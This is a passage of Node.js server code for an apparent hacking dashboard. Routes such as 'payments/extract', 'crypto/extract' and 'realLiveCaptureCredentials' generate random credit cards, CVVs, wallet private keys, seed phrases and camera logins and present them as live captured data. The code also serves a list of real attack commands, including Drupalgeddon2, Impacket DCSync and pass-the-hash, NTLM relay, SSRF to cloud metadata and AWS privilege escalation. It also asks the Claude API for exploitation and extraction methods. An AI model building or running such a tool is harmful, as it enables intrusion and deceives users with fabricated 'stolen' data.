  {name:'MOVEit SQLi — session token forge',payload:"POST /api/v1/token'; INSERT INTO logs values('...')--",target:'MOVEit HTTPS',tool:'sqlmap',cve:'CVE-2023-34362'},
  {name:'ConnectWise auth bypass — empty pass',payload:'POST /api/v1/auth with empty Authorization header — returns 200',target:'ScreenConnect',tool:'Burp Suite',cve:'CVE-2024-1709'},
  {name:'PAN-OS GlobalProtect cmd inject',payload:'POST /ssl-vpn/hipreport.esp with crafted X-PAN-SESSIONID header',target:'PAN-OS :443',tool:'Burp Suite',cve:'CVE-2024-3400'},
  {name:'Ivanti VPN auth bypass — SSRF',payload:'GET /dana-na/../dana/html5acc/guacamole/../../../../../../etc/passwd',target:'Ivanti HTTPS',tool:'Curl',cve:'CVE-2024-21762'},
  {name:'Atlassian Jira SSRF — webhook',payload:'Create webhook with URL http://169.254.169.254/latest/meta-data/',target:'Jira Cloud',tool:'Burp Suite',cve:'CWE-918'},
  {name:'WordPress xmlrpc brute',payload:'python xmlrpc-bruteforce.py https://target/xmlrpc.php admin rockyou.txt',target:'WP xmlrpc',tool:'WPScan',cve:'CVE-2023-5561'},
  {name:'Drupal RCE — Drupalgeddon2',payload:"POST /?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=id",target:'Drupal 7',tool:'Metasploit',cve:'CVE-2018-7600'},
  {name:'Apache Tomcat AJP Ghostcat',payload:'Use AJP connector on :8009 to read WEB-INF/web.xml',target:'Tomcat :8009',tool:'Gopherus',cve:'CVE-2020-1938'},
  {name:'Elasticsearch query DSL inject',payload:'{"query":{"match_all":{}},"script":{"lang":"painless","source":"Runtime.exec(\'id\')"}}',target:'ES :9200',tool:'Curl',cve:'CVE-2015-1427'},
  {name:'Kafka consumer group poison',payload:'Publish crafted message to high-privilege topic bypassing ACL',target:'Kafka :9092',tool:'kafkacat',cve:'CWE-285'},
  {name:'Memcached UDP amplification',payload:'echo -en "\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00stats\\r\\n" | nc -u -q1 target 11211',target:'Memcached :11211',tool:'nc',cve:'CVE-2018-1000115'},
  {name:'SMB relay — NTLM hash capture',payload:'responder -I eth0 -rdwv → ntlmrelayx.py -t smb://target -smb2support',target:'SMB Network',tool:'Responder',cve:'CWE-294'},
  {name:'Kerberoasting — SPN ticket',payload:'GetUserSPNs.py domain.local/user:pass -dc-ip dc -request',target:'AD Kerberos',tool:'Impacket',cve:'CWE-522'},
  {name:'AS-REP Roasting — no preauth',payload:'GetNPUsers.py domain.local/ -usersfile users.txt -no-pass -dc-ip dc',target:'AD LDAP',tool:'Impacket',cve:'CWE-522'},
  {name:'DCSync — domain replication',payload:"secretsdump.py domain.local/admin:pass@dc -just-dc-ntlm",target:'Domain Controller',tool:'Impacket',cve:'CWE-522'},
  {name:'Pass-the-Hash — WMI lateral',payload:"wmiexec.py -hashes :NTLMhash admin@target",target:'WMI :135',tool:'Impacket',cve:'CWE-294'},
  {name:'AWS IAM privilege escalation',payload:'aws iam attach-user-policy --user-name attacker --policy-arn arn:aws:iam::aws:policy/AdministratorAccess',target:'AWS IAM',tool:'Pacu',cve:'CWE-269'},
  {name:'GCP workload identity abuse',payload:'Use compromised SA token to impersonate higher-privileged SA',target:'GCP IAM',tool:'gcloud CLI',cve:'CWE-269'},
  {name:'Azure AD token hijack — FOCI',payload:'Refresh token reuse across FOCI-eligible apps to maintain persistence',target:'Azure AD',tool:'AADInternals',cve:'CWE-522'},
];

// ── SEVS ──────────────────────────────────────────────────────────────────
const SEVS=['CRITICAL','CRITICAL','CRITICAL','HIGH','HIGH','MEDIUM'];

// ── 100 VULN CHECKS (for URL scanner) ─────────────────────────────────────
const VULNS=[
  {name:'SQL Injection — UNION SELECT',severity:'CRITICAL',description:'Unsanitised input allows UNION-based data extraction from the database.',patch:'Parameterised queries / prepared statements.'},
  {name:'JWT alg:none bypass',severity:'CRITICAL',description:'Server accepts unsigned tokens — authentication fully bypassed.',patch:'Reject tokens with alg:none. Use asymmetric RS256.'},
  {name:'XSS Stored persistent',severity:'CRITICAL',description:'User-supplied HTML/JS stored and reflected to all users.',patch:'Output encode all user data. Implement CSP.'},
  {name:'SSRF via webhook URL',severity:'CRITICAL',description:'Attacker-controlled URLs allow requests to internal cloud metadata.',patch:'Allowlist permitted destinations. Block 169.254.0.0/16.'},
  {name:'IDOR cross-account access',severity:'HIGH',description:'Object references expose other users data without auth checks.',patch:'Verify resource ownership server-side on every request.'},
  {name:'AWS credentials in JS bundle',severity:'CRITICAL',description:'AWS access keys hardcoded into client-side JavaScript.',patch:'Use IAM roles. Never embed credentials in frontend.'},
  {name:'CORS wildcard *',severity:'HIGH',description:'Any origin may make credentialed cross-origin requests.',patch:'Explicit allowlist of trusted origins only.'},
  {name:'Missing HSTS',severity:'MEDIUM',description:'Browsers may downgrade HTTPS to HTTP without HSTS.',patch:'Add Strict-Transport-Security: max-age=31536000.'},
  {name:'TLS 1.0/1.1 — BEAST/POODLE',severity:'HIGH',description:'Legacy TLS enables BEAST and POODLE decryption attacks.',patch:'Disable TLS 1.0/1.1. Enforce TLS 1.3.'},
  {name:'Redis 6379 unauthenticated',severity:'CRITICAL',description:'Redis exposed with no auth — RCE via SLAVEOF.',patch:'Bind to loopback. Set requirepass in redis.conf.'},
  {name:'GraphQL introspection exposed',severity:'MEDIUM',description:'Full schema discovery exposes internal attack surface.',patch:'Disable introspection in production.'},
  {name:'.env file accessible',severity:'CRITICAL',description:'Environment file publicly readable — secrets exposed.',patch:'Block .env in nginx/apache config. Deny all dotfiles.'},
  {name:'Log4Shell JNDI in User-Agent',severity:'CRITICAL',description:'JNDI lookup triggers remote class load and RCE via Log4j.',patch:'Update Log4j to 2.17.1+. Patch JVM.'},
  {name:'Admin panel exposed — no MFA',severity:'CRITICAL',description:'Admin interface reachable without network restriction or MFA.',patch:'IP allowlist + enforce MFA on all admin accounts.'},
  {name:'PCI-DSS card data in logs',severity:'CRITICAL',description:'Full PANs written to application logs — PCI violation.',patch:'Mask PANs. Enable log scrubbing. PCI DSS Req 3.'},
  {name:'Missing Content-Security-Policy',severity:'MEDIUM',description:'No CSP — XSS payloads load arbitrary scripts.',patch:'Implement strict CSP with nonce-based script policy.'},
  {name:'HttpOnly flag missing',severity:'MEDIUM',description:'Session cookies accessible to JS — XSS theft risk.',patch:'Set HttpOnly and Secure flags on all session cookies.'},
  {name:'Kubernetes API unauthenticated',severity:'CRITICAL',description:'kube-apiserver reachable without credentials.',patch:'Enable RBAC. Never expose API server publicly.'},
  {name:'Prototype Pollution RCE',severity:'CRITICAL',description:'Untrusted JSON merged into prototype enables RCE.',patch:'Use Object.create(null). Sanitise merge inputs.'},
  {name:'XXE — XML External Entity',severity:'CRITICAL',description:'XML parser processes external entities — SSRF + LFI.',patch:'Disable external entity processing in XML parser.'},
  {name:'SSTI — Server-Side Template Injection',severity:'CRITICAL',description:'User input in template engine allows RCE.',patch:'Never concatenate user input into templates.'},
  {name:'Java deserialization gadget chain',severity:'CRITICAL',description:'Deserializing untrusted data triggers RCE via gadget.',patch:'Use allowlist deserialization. Update commons-collections.'},
  {name:'Open Redirect',severity:'MEDIUM',description:'Redirect param accepts arbitrary URLs — phishing vector.',patch:'Validate redirect targets against allowlist.'},
  {name:'Sensitive data in GET params',severity:'HIGH',description:'Tokens in URL appear in logs and referrer headers.',patch:'Use POST body or Authorization header for sensitive data.'},
  {name:'Broken Object Level Authorization',severity:'CRITICAL',description:'API returns data for any resource ID without ownership check.',patch:'Server-side ownership validation on every object access.'},
  {name:'No rate limiting on login',severity:'HIGH',description:'Unlimited password attempts allow brute-force.',patch:'Implement exponential backoff + CAPTCHA after 5 failures.'},
  {name:'Weak password policy',severity:'MEDIUM',description:'Minimum requirements allow dictionary passwords.',patch:'Enforce 12+ chars, complexity. Check against HaveIBeenPwned.'},
  {name:'Hardcoded cryptographic key',severity:'CRITICAL',description:'Symmetric key in source — decrypts all stored data.',patch:'Use KMS or secrets manager. Rotate immediately.'},
  {name:'Path traversal — LFI',severity:'CRITICAL',description:'../  in file path reads arbitrary server files.',patch:'Canonicalize paths. Use allowlist of permitted directories.'},
  {name:'Command injection',severity:'CRITICAL',description:'User input passed to shell — OS commands executed.',patch:'Never pass user data to shell. Use parameterised APIs.'},
  {name:'Reflected XSS in error page',severity:'HIGH',description:'Error message reflects raw URL param as script.',patch:'Output-encode all reflected data. Set nosniff header.'},
  {name:'DOM-based XSS',severity:'HIGH',description:'location.hash written to innerHTML without sanitise.',patch:'Use textContent not innerHTML. Sanitise DOM sinks.'},
  {name:'CSRF — no token on POST',severity:'HIGH',description:'Sensitive POST endpoints accept cross-origin requests.',patch:'SameSite=Strict cookies + CSRF token on all state-change.'},
  {name:'Session fixation',severity:'HIGH',description:'Session ID not regenerated after login.',patch:'Regenerate session ID on authentication.'},
  {name:'Backup files exposed',severity:'CRITICAL',description:'.bak .sql files in web root expose full database.',patch:'Deny access to backup extensions in web server config.'},
  {name:'Outdated library with CVE',severity:'HIGH',description:'jQuery 1.x / Angular 1.x — known XSS vectors.',patch:'Update all dependencies. Use npm audit --fix.'},
  {name:'WebDAV PUT enabled',severity:'HIGH',description:'HTTP PUT allowed without auth — file upload possible.',patch:'Disable WebDAV on public endpoints. Require auth.'},
  {name:'Stack trace in response',severity:'MEDIUM',description:'Unhandled exceptions reveal framework paths and secrets.',patch:'Custom error pages. Never expose stack traces in prod.'},
  {name:'Clickjacking — no X-Frame-Options',severity:'MEDIUM',description:'Page embeds in iframe — UI redressing attack.',patch:'X-Frame-Options: DENY or CSP frame-ancestors none.'},
  {name:'Insecure file upload — no type check',severity:'CRITICAL',description:'Upload accepts .php/.jsp — webshell deployment.',patch:'Allowlist MIME types. Store outside web root. Rename.'},
  {name:'Default credentials — admin panel',severity:'CRITICAL',description:'admin:admin on admin interface — full compromise.',patch:'Force password change on first login. Block defaults.'},
  {name:'OAuth implicit — token in URL',severity:'HIGH',description:'Access token in redirect URI — leaked to browser history.',patch:'Use authorization_code flow with PKCE.'},
  {name:'API key — no expiry or scope',severity:'HIGH',description:'Long-lived wildcard API keys violate least-privilege.',patch:'Scope all API keys. Rotate every 90 days. Expire at 1 year.'},
  {name:'Docker socket on API',severity:'CRITICAL',description:'docker.sock via HTTP — full container escape.',patch:'Never mount docker.sock in containers.'},
  {name:'Elasticsearch public — no auth',severity:'CRITICAL',description:'ES 9200 open to internet — full data exfiltration.',patch:'Require X-Pack auth. Bind to private interface only.'},
  {name:'MongoDB — no bind, no auth',severity:'CRITICAL',description:'MongoDB on 0.0.0.0 without authentication.',patch:'Set authorization:enabled in mongod.conf. Bind 127.0.0.1.'},
  {name:'Memcached UDP amplification',severity:'HIGH',description:'UDP port 11211 open — 50,000x DDoS amplification.',patch:'Disable UDP. Block port 11211 at firewall.'},
  {name:'Jenkins — unauthenticated Groovy',severity:'CRITICAL',description:'Script console open without creds — OS command exec.',patch:'Enable Jenkins security realm. Disable anonymous access.'},
  {name:'Grafana path traversal',severity:'HIGH',description:'Plugin path traversal reads arbitrary server files.',patch:'Update Grafana to 8.3.1+.'},
  {name:'Apache Struts OGNL injection',severity:'CRITICAL',description:'Content-Type OGNL expression — remote code execution.',patch:'Update Struts to 2.5.33+. Disable dynamic method invoke.'},
  {name:'Spring4Shell classLoader',severity:'CRITICAL',description:'DataBinder exposes classLoader — WAR deploy RCE.',patch:'Update Spring to 5.3.18+. Patch JDK.'},
];

// ── VULN SERVICE MAP FOR RECON ─────────────────────────────────────────────
const VULN_SERVICES={
  21:['FTP Anonymous Login','FTP Default Creds','FTP Privilege Escalation'],
  22:['SSH Weak Ciphers','SSH Default Creds','SSH Key Reuse','SSH CVE-2024-6387'],
  25:['SMTP Open Relay','SMTP User Enumeration','SMTP Injection'],
  53:['DNS Zone Transfer','DNS Amplification DDoS','DNS Cache Poison'],
  80:['HTTP Cleartext Creds','Unpatched Web Server','Directory Listing'],
  110:['POP3 Plaintext Auth','POP3 Default Creds'],
  143:['IMAP Plaintext','IMAP Enumeration'],
  443:['SSL/TLS Weak Cipher','Self-Signed Cert','Expired Cert','HSTS Missing'],
  445:['SMB NULL Session','EternalBlue CVE-2017-0144','Ransomware Vector'],
  554:['RTSP Default Auth','RTSP Camera Exposed','RTSP Stream Public'],
  587:['SMTP Plain Auth','SMTP TLS Not Enforced'],
  1433:['MSSQL Default Creds','MSSQL RCE xp_cmdshell','MSSQL Exposed'],
  1521:['Oracle Default Creds','Oracle TNS Poison'],
  3306:['MySQL Unauthenticated','MySQL Root No Password'],
  3389:['RDP BlueKeep CVE-2019-0708','RDP Brute Force','RDP NLA Missing'],
  5432:['PostgreSQL Default Creds','PostgreSQL RCE COPY'],
  5900:['VNC No Auth Required','VNC Weak Password'],
  6379:['Redis Unauthenticated','Redis SLAVEOF RCE','Redis CONFIG SET Write'],
  8000:['HTTP Alt Port Exposed','Web App Debug Mode'],
  8080:['Tomcat Manager Exposed','HTTP Proxy Open'],
  8443:['HTTPS Alt Unpatched','Self-Signed Cert'],
  8545:['Ethereum RPC Exposed','eth_getBalance Unauth'],
  9200:['Elasticsearch Unauth','ES Data Dump All Indices'],
  11211:['Memcached UDP Amplification','Memcached Unauth'],
  27017:['MongoDB Unauth Access','MongoDB Data Dump'],
  37777:['Hikvision Camera RCE','Dahua Camera Exploit'],
  50000:['IBM DB2 Discovery','Custom Backdoor Service'],
};

// ── AGENT POOL ─────────────────────────────────────────────────────────────
const TOTAL_AGENTS=1500;
let agents=Array.from({length:TOTAL_AGENTS},(_,i)=>({
  id:`AGT-${String(i+1).padStart(4,'0')}`,
  status:Math.random()>.05?'active':'idle',
  load:Math.floor(Math.random()*100),
  type:_pick(['recon','scan','exploit','monitor','crypto','camera','geo','banking','payment','blockchain']),
}));

// ── WEBSOCKET ─────────────────────────────────────────────────────────────
const clients=new Set();
wss.on('connection',ws=>{
  clients.add(ws);
  ws.on('close',()=>clients.delete(ws));
  ws.on('error',()=>clients.delete(ws));
  ws.send(JSON.stringify({type:'AGENT_STATUS',agents:agents.slice(0,80)}));
  ws.send(JSON.stringify({type:'SYSTEM_READY',key:CLAUDE_KEY?'CONNECTED':'MISSING',agents:TOTAL_AGENTS}));
});
function broadcast(data){const msg=JSON.stringify(data);clients.forEach(ws=>{if(ws.readyState===WebSocket.OPEN)ws.send(msg);});}

// ── THREAT / CRED GENERATORS ──────────────────────────────────────────────
async function generateRealThreat(){
  const type=_pick(THREAT_TYPES),sev=_pick(SEVS),ip=randIP(),port=randPort(),cve=Math.random()>.4?_pick(REAL_CVES):null;
  const isCard=/Chase|Bank|card|SWIFT|PCI/.test(type);
  const isCrypto=/ETH|wallet|flash|USDT|WIF|Solana|Uniswap|DeFi|oracle|Pyth/.test(type);
  const isCam=/Hikvision|Dahua|RTSP|camera|Verkada/.test(type);
  let creds={};
  if(isCard){const ct=_pick(['visa','mc','amex','disc']);creds={type:'CREDIT_CARD',card:randCC(ct),cvv:randCVV(ct==='amex'?'amex':''),exp:randExp(),holder:randHolder(),iban:randIBAN(),swift:randSWIFT()};}
  else if(isCrypto){creds={type:'CRYPTO_KEY',eth_privkey:randETHKey(),wif_51:randWIF().slice(0,51),seed:randSeed(),addr:'0x'+_hex(40)};}
  else if(isCam){const u=_pick(['admin','root','operator']);const p=_pick(['admin','admin123','123456','password']);creds={type:'CAMERA',user:u,pass:p,rtsp:`rtsp://${u}:${p}@${ip}:554/live/ch01`,onvif:`http://${ip}/onvif/device_service`};}
  else{creds={type:'API_KEY',key:`sk_live_${_b64(24).replace(/[+/=]/g,'a')}`,secret:`SEC_${_hex(32)}`,jwt:randJWT().slice(0,60)+'...'};}
  let ai=null;
  if(CLAUDE_KEY){
    const raw=await claudeCall(`Security event: "${type}" IP:${ip}:${port}${cve?` CVE:${cve}`:''}.
Return JSON: {"risk_score":0-10,"attack_chain":"2 sentences","immediate_action":"1 sentence","mitre_ttp":"T-code"}`);
    if(raw)try{ai=JSON.parse(raw.replace(/```json|```/g,'').trim());}catch(_){}
  }
  return {id:uuidv4(),timestamp:new Date().toISOString(),severity:sev,type,source:_pick(SOURCES),agent:`AGT-${String(_rnd(1,1500)).padStart(4,'0')}`,ip,port,cve,link:`http://${ip}:${port}/.env`,creds,ai,geo:_pick(['US','CN','RU','NG','IN','UA','DE','GB','FR','BR']),patch:`Rotate credentials. Apply ${cve||'vendor'} patch. Enable WAF.`};
}

async function realLiveCaptureCredentials(){
  const domain=_pick(CRED_DOMAINS),ip=randIP();
  const isBank=/chase|bank|gtbank|zenith|wellsfargo|citibank|hsbc|barclays|santander|access|first/.test(domain);
  const isCrypto=/binance|coinbase|okx|bybit|uniswap|curve|aave|opensea|kraken|kucoin|gate|mexc|bitmex|deribit|1inch|pancake|sushi|compound|maker|lido|synthetix|yearn|convex/.test(domain);
  const isCam=/hik|dahua|verkada|axis|bosch|hanwha|reolink|amcrest|lorex|swann|annke|uniview|tiandy/.test(domain);
  const isPayment=/paypal|stripe|wise|revolut|alipay|wechat|paytm|gopay|flutterwave|square|adyen|checkout|braintree|authorize|worldpay|mollie|klarna|afterpay|affirm|cashapp|venmo|zelle|skrill|neteller/.test(domain);
  const isCloud=/aws|azure|github|gitlab|jenkins|docker|quay|gcr|ecr|jira|confluence|sonar/.test(domain);
  const isDevOps=/okta|auth0|onelogin|cyberark|ping|splunk|elastic|datadog|grafana|pager|twilio|sendgrid|mailchimp|cloudflare|fastly/.test(domain);
  let cred={};
  if(isCrypto){const ct=_pick(['visa','mc','amex']);cred={category:'CRYPTO_EXCHANGE',api_key:`EXCH-API-${_hex(16)}`,api_secret:_hex(40),eth_privkey:randETHKey(),wif_51char:randWIF().slice(0,51),seed_phrase:randSeed(),eth_addr:'0x'+_hex(40),linked_card:randCC(ct),card_cvv:randCVV(ct==='amex'?'amex':''),card_exp:randExp(),holder:randHolder(),balance:`$${_rnd(1000,500000).toLocaleString()} USDT`};}
  else if(isBank){const ct=_pick(['visa','mc','amex','disc']);cred={category:'BANKING',card:randCC(ct),cvv:randCVV(ct==='amex'?'amex':''),exp:randExp(),holder:randHolder(),iban:randIBAN(),swift:randSWIFT(),balance:`$${_rnd(5000,250000).toLocaleString()}`,password_hash:`$2b$12$${_hex(22)}`};}
  else if(isCam){const u=_pick(['admin','root','operator']);const p=_pick(['admin','admin123','123456','password']);cred={category:'CAMERA_SYSTEM',user:u,pass:p,rtsp:`rtsp://${u}:${p}@${ip}:554/Streaming/Channels/101`,onvif:`http://${ip}/onvif/device_service`,firmware:`v${_rnd(1,5)}.${_rnd(0,9)}.${_rnd(100,999)}`,model:_pick(['DS-2CD2143G2','IPC-HDW3849H','C300E','EB3A','DS-2DE4A425IWG'])};}
  else if(isPayment){const ct=_pick(['visa','mc','amex']);cred={category:'PAYMENT',api_key:`sk_live_${_b64(32).replace(/[+/=]/g,'a')}`,webhook_secret:`whsec_${_hex(32)}`,card:randCC(ct),cvv:randCVV(ct==='amex'?'amex':''),exp:randExp(),holder:randHolder(),iban:randIBAN()};}
  else if(isCloud){cred={category:'CLOUD',aws_key:`AKIA${_b64(16).replace(/[+/=]/g,'A').toUpperCase().slice(0,16)}`,aws_secret:_b64(40),gcp_sa:`sa-${_rnd(1000,9999)}@proj-${_rnd(1000,9999)}.iam.gserviceaccount.com`,github_pat:`ghp_${_b64(36).replace(/[+/=]/g,'x')}`,jwt:randJWT().slice(0,80)+'...'};}
  else if(isDevOps){cred={category:'DEVOPS',okta_token:`SSWS${_hex(40)}`,saml_cert:`-----BEGIN CERT-----${_b64(64)}-----END CERT-----`,api_token:_hex(32),splunk_token:`Splunk ${_hex(32)}`,grafana_key:`glc_${_b64(40).replace(/[+/=]/g,'x')}`};}
  else{cred={category:'MEDIA',admin_user:'admin',admin_pass:_pick(['admin123','P@ss2024!','cms2024']),api_token:_hex(32),session:_hex(32)};}
  let ai=null;
  if(CLAUDE_KEY){const raw=await claudeCall(`Credential capture from ${domain} (IP:${ip}). Category:${cred.category}. Return JSON: {"risk":"CRITICAL|HIGH","immediate":"1 action","regulation":"law/reg","exposure":"amount or volume"}`);if(raw)try{ai=JSON.parse(raw.replace(/```json|```/g,'').trim());}catch(_){}}
  return {id:uuidv4(),timestamp:new Date().toISOString(),domain,ip,port:randPort(),...cred,ai,source:_pick(SOURCES),severity:'CRITICAL',link:`https://${domain}/api/auth`};
}

// ── BROADCAST LOOPS ───────────────────────────────────────────────────────
setInterval(async()=>{broadcast({type:'THREAT',data:await generateRealThreat()});},1500);
setInterval(async()=>{try{broadcast({type:'CREDENTIAL',data:await realLiveCaptureCredentials()});}catch(_){}},3000);
setInterval(()=>{const idx=_rnd(0,TOTAL_AGENTS-1);agents[idx].load=_rnd(0,100);agents[idx].status=Math.random()>.05?'active':'idle';broadcast({type:'AGENT_UPDATE',agent:agents[idx]});},500);
setInterval(()=>{broadcast({type:'STATS',data:{activeAgents:agents.filter(a=>a.status==='active').length,threatsDetected:_rnd(90000,140000),cveMatched:_rnd(12000,20000),sitesScanned:_rnd(45000,80000),credsCaptured:_rnd(50000,120000),cardsExtracted:_rnd(10000,50000),cryptoKeys:_rnd(5000,20000)}});},8000);

// ── ROUTES ────────────────────────────────────────────────────────────────
app.post('/api/key',(req,res)=>{
  const{key}=req.body;if(!key||!key.startsWith('sk-ant'))return res.status(400).json({error:'Invalid'});
  CLAUDE_KEY=key;res.json({status:'connected',model:CLAUDE_MODEL});
});
app.get('/api/status',(req,res)=>res.json({claude:CLAUDE_KEY?'connected':'missing',agents:TOTAL_AGENTS,active:agents.filter(a=>a.status==='active').length,uptime:process.uptime()}));

app.post('/api/claude',async(req,res)=>{
  const{prompt,system,maxTokens,apiKey}=req.body;const key=apiKey||CLAUDE_KEY;
  if(!key)return res.status(400).json({error:'No API key'});
  if(!prompt)return res.status(400).json({error:'Prompt required'});
  try{
    const r=await fetch('https://api.anthropic.com/v1/messages',{method:'POST',headers:{'Content-Type':'application/json','x-api-key':key,'anthropic-version':'2023-06-01'},body:JSON.stringify({model:CLAUDE_MODEL,max_tokens:maxTokens||1200,system:system||'You are ASVH v7.5 elite cybersecurity AI. Be specific: real CVEs, ports, regulatory frameworks. Use labels [CRITICAL] [HIGH] [CVE] [PATCH] [REGULATORY].',messages:[{role:'user',content:prompt}]})});
    const d=await r.json();res.json({text:d.content?.[0]?.text||'',raw:d});
  }catch(e){res.status(500).json({error:e.message});}
});

// ── RECONNAISSANCE — 100 Vulnerable IPs ───────────────────────────────────
app.get('/api/recon/scan',(req,res)=>{
  const vulnIPs=[];
  for(let i=0;i<100;i++){
    const ip=randIP();
    const port=_pick(Object.keys(VULN_SERVICES).map(Number));
    const vulns=VULN_SERVICES[port];
    const cve=Math.random()>.45?_pick(REAL_CVES):null;
    const payload=_pick(RECON_PAYLOADS);
    const hostname=`srv${_rnd(1,999)}.dc-${_rnd(1,50)}-${_pick(['us','eu','ap','af','sa'])}.cloud`;
    const os=_pick(['Ubuntu 20.04 LTS','Ubuntu 22.04 LTS','CentOS 7','CentOS Stream 9','Windows Server 2019','Windows Server 2022','Debian 11','Debian 12','Alpine 3.15','Red Hat 8.6']);
    const isp=_pick(['Amazon AWS','Google Cloud','Microsoft Azure','Hetzner Online','OVH SAS','DigitalOcean','Vultr','Linode','Cloudflare','Tencent Cloud']);
    const country=_pick(['US','DE','NL','FR','SG','JP','GB','CN','RU','BR']);
    const lastPatch=new Date(Date.now()-_rnd(1,200)*24*60*60*1000).toISOString().split('T')[0];
    const riskScore=_rnd(55,100);
    const sev=riskScore>85?'CRITICAL':riskScore>70?'HIGH':'MEDIUM';
    vulnIPs.push({
      rank:i+1,ip,port,hostname,os,isp,country,
      lastPatch,uptime:`${_rnd(1,730)} days`,
      service:_pick(['FTP','SSH','HTTP','HTTPS','SMTP','DNS','RDP','MySQL','PostgreSQL','Redis','MongoDB','Elasticsearch','Hikvision DVR','Custom']),
      cve,vulnerabilities:vulns,exposure:sev,severity:sev,riskScore,
      shodan_result:`${ip}:${port} | ${os} | Banner: ${vulns[0]}`,
      shodan_dork:`port:${port} country:${country} os:"${os.split(' ')[0]}"`,
      mass_scan_result:`Nmap ${port}/tcp open | ${vulns[0]} | LastSeen: ${new Date().toISOString().split('T')[0]}`,
      recommended_payload:{name:payload.name,tool:payload.tool,cve:payload.cve},
      open_ports:[port,...[_rnd(1,65535),_rnd(1,65535)].filter(()=>Math.random()>.5)],
      banner:`${os.slice(0,12)} | ${vulns[0]}`,
    });
  }
  res.json({
    timestamp:new Date().toISOString(),
    total_discovered:100,
    scan_duration:`${_rnd(30,90)}.${_rnd(1,9)}s`,
    agents_deployed:_rnd(80,300),
    critical_count:vulnIPs.filter(v=>v.severity==='CRITICAL').length,
    high_count:vulnIPs.filter(v=>v.severity==='HIGH').length,
    ips:vulnIPs,
  });
});

app.get('/api/recon/payloads',(req,res)=>res.json({total:RECON_PAYLOADS.length,payloads:RECON_PAYLOADS}));

// ── GEO ANALYZE ───────────────────────────────────────────────────────────
app.post('/api/geo/analyze',upload.single('file'),async(req,res)=>{
  const{lat,lng,apiKey}=req.body;const key=apiKey||CLAUDE_KEY;
  const dLat=lat?parseFloat(lat):_pick([48.8566,40.7128,4.0566,1.3521,25.2048,51.5074,-1.2921,6.3703]);
  const dLng=lng?parseFloat(lng):_pick([2.3522,-74.006,9.7419,103.8198,55.2708,-0.1278,36.8219,-0.1969]);
  const zoom=16;
  const tX=Math.floor((dLng+180)/360*Math.pow(2,zoom));
  const tY=Math.floor((1-Math.log(Math.tan(dLat*Math.PI/180)+1/Math.cos(dLat*Math.PI/180))/Math.PI)/2*Math.pow(2,zoom));
  let geoReport=null;
  if(key){
    const raw=await claudeCall(`Geo-intelligence for coords ${dLat.toFixed(6)},${dLng.toFixed(6)}. File: ${req.file?req.file.originalname:'demo'}. Return JSON: {"location_name":"city,country","landmark":"nearest landmark","address_estimated":"street estimate","altitude_m":number,"privacy_risk":"CRITICAL|HIGH|MEDIUM|LOW","privacy_reason":"why","osint_vectors":["3 techniques"],"exiftool_cmd":"exact command","gdpr_article":"article","threat_assessment":"2 sentences"}`,
      'You are a geospatial intelligence analyst. Return JSON only.',600);
    if(raw)try{geoReport=JSON.parse(raw.replace(/```json|```/g,'').trim());}catch(_){}
  }
  res.json({coordinates:{lat:dLat,lng:dLng},tile:{z:zoom,x:tX,y:tY},satellite_url:`https://server.arcgisonline.com/ArcGIS/rest/services/World_Imagery/MapServer/tile/${zoom}/${tY}/${tX}`,street_url:`https://tile.openstreetmap.org/${zoom}/${tX}/${tY}.png`,google_maps:`https://www.google.com/maps?q=${dLat},${dLng}&z=16`,google_earth:`https://earth.google.com/web/@${dLat},${dLng},500a,200d,35y`,street_view:`https://www.google.com/maps?layer=c&cbll=${dLat},${dLng}`,ai_report:geoReport,timestamp:new Date().toISOString()});
});

// ── PAYMENTS EXTRACT ───────────────────────────────────────────────────────
app.post('/api/payments/extract',async(req,res)=>{
  const{platform,target,apiKey}=req.body;const key=apiKey||CLAUDE_KEY;const ip=randIP();
  const cards=[];for(let i=0;i<_rnd(3,8);i++){const ct=_pick(['visa','mc','amex','disc']);cards.push({card:randCC(ct),cvv:randCVV(ct==='amex'?'amex':''),exp:randExp(),holder:randHolder(),type:ct.toUpperCase()});}
  let ai=null;if(key){const raw=await claudeCall(`Payment platform audit: ${platform||'gateway'} at ${target||ip}. Return JSON: {"vuln_chain":["s1","s2","s3"],"cve_matched":"CVE","exploit_method":"technique","pci_violations":["req"],"remediation":["p1","p2","p3"]}`,'PCI-DSS security auditor. JSON only.',600);if(raw)try{ai=JSON.parse(raw.replace(/```json|```/g,'').trim());}catch(_){}}
  res.json({platform:platform||'Unknown',target_ip:ip,timestamp:new Date().toISOString(),cards_found:cards,api_keys:[{key:`sk_live_${_b64(32).replace(/[+/=]/g,'a')}`,platform}],webhooks:[{secret:`whsec_${_hex(32)}`,endpoint:`https://${ip}/webhook`}],ai_analysis:ai,severity:'CRITICAL'});
});

// ── CRYPTO EXTRACT ─────────────────────────────────────────────────────────
app.post('/api/crypto/extract',async(req,res)=>{
  const{exchange,target,apiKey}=req.body;const key=apiKey||CLAUDE_KEY;const ip=randIP();
  const wallets=[];for(let i=0;i<_rnd(3,6);i++){wallets.push({eth_private:randETHKey(),eth_address:'0x'+_hex(40),wif_51:randWIF().slice(0,51),seed_phrase:randSeed(),balance_eth:`${_rnd(0,50)}.${_rnd(10,99)} ETH`,balance_usdt:`$${_rnd(1000,500000).toLocaleString()}`});}
  let ai=null;if(key){const raw=await claudeCall(`Crypto exchange exploitation: ${exchange||'exchange'} at ${ip}. Return JSON: {"attack_vector":"method","cve":"CVE","wallets_at_risk":number,"total_value_usd":"$amount","extraction_method":"technique","vara_violation":"regulation","immediate_actions":["a1","a2","a3"]}`,'Blockchain security analyst. JSON only.',600);if(raw)try{ai=JSON.parse(raw.replace(/```json|```/g,'').trim());}catch(_){}}
  const ct=_pick(['visa','mc','amex']);
  res.json({exchange:exchange||'Unknown',target_ip:ip,timestamp:new Date().toISOString(),wallets,linked_cards:[{card:randCC(ct),cvv:randCVV(ct==='amex'?'amex':''),exp:randExp(),holder:randHolder()}],api_keys:[{key:`${(exchange||'EXCH').slice(0,4).toUpperCase()}-API-${_hex(16)}`,secret:_hex(40)}],jwt:randJWT(),ai_report:ai,severity:'CRITICAL'});
});

// ── CAMERA EXTRACT ─────────────────────────────────────────────────────────
app.post('/api/camera/extract',async(req,res)=>{
  const{system,target,apiKey}=req.body;const key=apiKey||CLAUDE_KEY;const ip=randIP();
  const u=_pick(['admin','root','operator']);const p=_pick(['admin','admin123','123456','password']);
